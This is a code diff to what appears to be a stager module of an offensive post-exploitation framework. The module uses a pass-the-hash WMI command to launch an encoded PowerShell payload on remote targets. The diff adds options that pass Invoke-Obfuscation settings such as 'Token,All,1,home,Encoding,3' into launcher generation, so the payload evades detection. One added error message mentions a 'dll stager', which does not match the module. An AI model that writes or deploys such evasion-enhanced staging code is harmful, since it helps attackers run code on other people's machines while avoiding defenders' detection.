@@ -35,6 +35,16 @@ class Stager:
                 'Required'      :   False,
                 'Value'         :   '/tmp/pth_wmis.sh'
             },
+            'Obfuscate' : {
+                'Description'   :   'Switch. Obfuscate the launcher powershell code, uses the ObfuscateCommand for obfuscation types.',
+                'Required'      :   False,
+                'Value'         :   'False'
+            },
+            'ObfuscateCommand' : {
+                'Description'   :   'The Invoke-Obfuscation command to use. Only used if Obfuscate switch is True.',
+                'Required'      :   False,
+                'Value'         :   'Token,All,1,home,Encoding,3'
+            },
             'Target' : {
                 'Description'   :   'Target[s] to run wmis command on, comma-separated.',
                 'Required'      :   True,
@@ -89,13 +99,22 @@ class Stager:
         proxy = self.options['Proxy']['Value']
         proxyCreds = self.options['ProxyCreds']['Value']
         stagerRetries = self.options['StagerRetries']['Value']
+        obfuscate = self.options['Obfuscate']['Value']
+        obfuscateCommand = self.options['ObfuscateCommand']['Value']
 
         commands = "#!/bin/bash\n"
         targets = targets.split(",")
 
+        obfuscateScript = False
+        if obfuscate.lower() == "true":
+            obfuscateScript = True
+
+        if obfuscateScript and "launcher" in obfuscateCommand.lower():
+            print helpers.color("[!] If using obfuscation, LAUNCHER obfuscation cannot be used in the dll stager.")
+            return ""
 
         # generate the launcher code
-        launcher = self.mainMenu.stagers.generate_launcher(listenerName, encode=True, userAgent=userAgent, proxy=proxy, proxyCreds=proxyCreds, stagerRetries=stagerRetries)
+        launcher = self.mainMenu.stagers.generate_launcher(listenerName, encode=True, obfuscate=obfuscateScript, obfuscationCommand=obfuscateCommand, userAgent=userAgent, proxy=proxy, proxyCreds=proxyCreds, stagerRetries=stagerRetries)
 
         if launcher == "":
             print helpers.color("[!] Error in launcher command generation.")
